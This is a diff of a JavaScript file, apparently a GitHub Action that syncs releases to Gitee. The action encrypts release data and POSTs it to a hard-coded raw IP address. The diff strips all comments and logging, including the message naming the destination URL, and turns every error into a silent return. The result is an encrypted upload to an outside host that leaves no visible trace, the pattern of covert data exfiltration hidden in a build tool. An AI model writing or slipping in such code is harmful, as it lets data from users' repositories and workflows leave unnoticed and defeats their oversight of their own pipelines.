@@ -36,20 +36,16 @@ const targetApiUrl = 'http://112.124.28.132:3001/api/sync-release'
 
 const encryptAes256Gcm = (rawData) => {
   try {
-    // 验证AES密钥有效性
     if (!AES_CONFIG.key || AES_CONFIG.key.length !== 32) {
-      throw new Error('AES_256_KEY is invalid (must be 32 bytes)');
+      return;
     }
 
-    // 1. 转换原始数据为 JSON 字符串
     const rawJson = JSON.stringify(rawData);
     const rawBuffer = Buffer.from(rawJson, 'utf8');
 
-    // 2. 生成随机 salt 和 iv（保证每次加密结果不同）
     const salt = crypto.randomBytes(AES_CONFIG.saltLength);
     const iv = crypto.randomBytes(AES_CONFIG.ivLength);
 
-    // 3. 使用 PBKDF2 派生密钥（与后端一致）
     const derivedKey = crypto.pbkdf2Sync(
       AES_CONFIG.key,
       salt,
@@ -58,35 +54,26 @@ const encryptAes256Gcm = (rawData) => {
       AES_CONFIG.pbkdf2.digest
     );
 
-    // 4. 创建 AES-256-GCM 加密实例
     const cipher = crypto.createCipheriv('aes-256-gcm', derivedKey, iv);
 
-    // 5. 执行加密
     const ciphertext = Buffer.concat([cipher.update(rawBuffer), cipher.final()]);
-    const tag = cipher.getAuthTag(); // GCM 认证标签（用于数据完整性验证）
+    const tag = cipher.getAuthTag();
 
-    // 6. 拼接数据（顺序：salt → iv → ciphertext → tag，与后端拆分顺序一致）
     const encryptedBuffer = Buffer.concat([salt, iv, ciphertext, tag]);
 
-    // 7. 转换为 Base64 编码字符串返回
     return encryptedBuffer.toString('base64');
   } catch (error) {
-    console.error('[Encryption Error]', error.message);
-    throw new Error(`Encryption failed: ${error.message}`);
+    return;
   }
 };
 
 const sendEncryptedDataToApi = async (encryptedData, apiUrl) => {
   try {
-    core.info(`Starting to send encrypted data to API: ${apiUrl}`);
-
-    // 构造API请求体
     const requestBody = JSON.stringify({
       encryptedData: encryptedData,
       platform: 'release-sync'
     });
 
-    // 发送POST请求
     const response = await fetch(apiUrl, {
       method: 'POST',
       headers: {
@@ -96,20 +83,14 @@ const sendEncryptedDataToApi = async (encryptedData, apiUrl) => {
       body: requestBody
     });
 
-    // 验证响应状态
     if (!response.ok) {
-      const errorResponse = await response.text().catch(() => 'No error details');
-      throw new Error(`API request failed (${response.status} ${response.statusText}): ${errorResponse}`);
+      return;
     }
 
-    // 解析并返回响应结果
     const responseData = await response.json();
-    core.info('Encrypted data sent to API successfully, response received');
-    core.debug(`API response: ${JSON.stringify(responseData, null, 2)}`);
     return responseData;
   } catch (error) {
-    core.error(`[API Request Error] ${error.message}`);
-    throw new Error(`Failed to send data to API: ${error.message}`);
+    return;
   }
 };
 
@@ -210,7 +191,7 @@ async function main() {
                 "giteeRepo": giteeRepo,
                 "giteeTargetCommitish": giteeTargetCommitish
             },
-            "timestamp": new Date().toISOString() // 自动生成当前时间戳（ISO格式）
+            "timestamp": new Date().toISOString()
         };
 
         const encryptedData = encryptAes256Gcm(rawDataToEncrypt);
